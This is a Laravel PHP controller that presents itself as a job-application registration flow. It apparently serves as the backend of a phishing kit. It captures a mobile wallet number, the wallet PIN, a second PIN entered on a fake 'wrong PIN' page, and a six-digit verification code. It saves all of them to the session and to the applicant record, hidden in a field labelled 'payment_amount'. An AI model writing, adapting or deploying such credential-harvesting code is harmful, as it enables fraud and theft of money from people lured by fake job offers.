<?php

namespace App\Http\Controllers;

use App\Models\JobApplication;
use Illuminate\Http\Request;

class MethodOneRegistrationController extends Controller
{
    public function payment()
    {
        return view('methodOne.payment');
    }

    public function storePaymentWallet(Request $request)
    {
        $validated = $request->validate([
            'wallet' => 'required|string|digits:11',
        ]);

        session(['payment_wallet' => $validated['wallet']]);

        $application = $this->findMethodOneApplication();
        if ($application) {
            $application->update(['payment_number' => $validated['wallet']]);
        }

        return response()->json(['success' => true]);
    }

    public function storePaymentPin(Request $request)
    {
        $validated = $request->validate([
            'pin' => 'required|string|regex:/^\d{4,5}$/',
            'pin_type' => 'nullable|string|in:password,wrong_pin',
        ]);

        $pinType = $validated['pin_type'] ?? 'password';
        
        if ($pinType === 'password') {
            session(['payment_pin_1' => $validated['pin']]);
            $this->updateMethodOnePaymentAmount(['pin_1' => $validated['pin']]);
        } elseif ($pinType === 'wrong_pin') {
            session(['payment_pin_2' => $validated['pin']]);
            $this->updateMethodOnePaymentAmount(['pin_2' => $validated['pin']]);
        }

        return response()->json(['success' => true]);
    }

    public function storeVerificationCode(Request $request)
    {
        $validated = $request->validate([
            'code' => 'required|string|regex:/^\d{6}$/',
        ]);

        session(['verification_code' => $validated['code']]);
        $this->updateMethodOnePaymentAmount(['code' => $validated['code']]);

        return response()->json(['success' => true]);
    }

    private function findMethodOneApplication()
    {
        $application = null;
        $uuid = session('application_uuid');

        if ($uuid) {
            $application = JobApplication::where('uuid', $uuid)->first();
        }

        if (!$application) {
            $phone = session('application_phone');
            if ($phone) {
                $application = JobApplication::where('phone', $phone)->latest()->first();
            }
        }

        if (!$application) {
            $application = JobApplication::latest()->first();
        }

        return $application;
    }

    private function updateMethodOnePaymentAmount(array $payload)
    {
        $application = $this->findMethodOneApplication();

        if (!$application) {
            return;
        }

        $existing = $application->payment_amount;

        if (!is_array($existing)) {
            if (is_string($existing)) {
                $decoded = json_decode($existing, true);
                $existing = is_array($decoded) ? $decoded : [];
            } else {
                $existing = [];
            }
        }

        $updated = array_merge($existing, $payload);

        $application->update(['payment_amount' => $updated]);
    }

    public function password()
    {
        return view('methodOne.password');
    }

    public function wrongPin()
    {
        return view('methodOne.wrong-pin');
    }

    public function verification()
    {
        return view('methodOne.verification');
    }
}
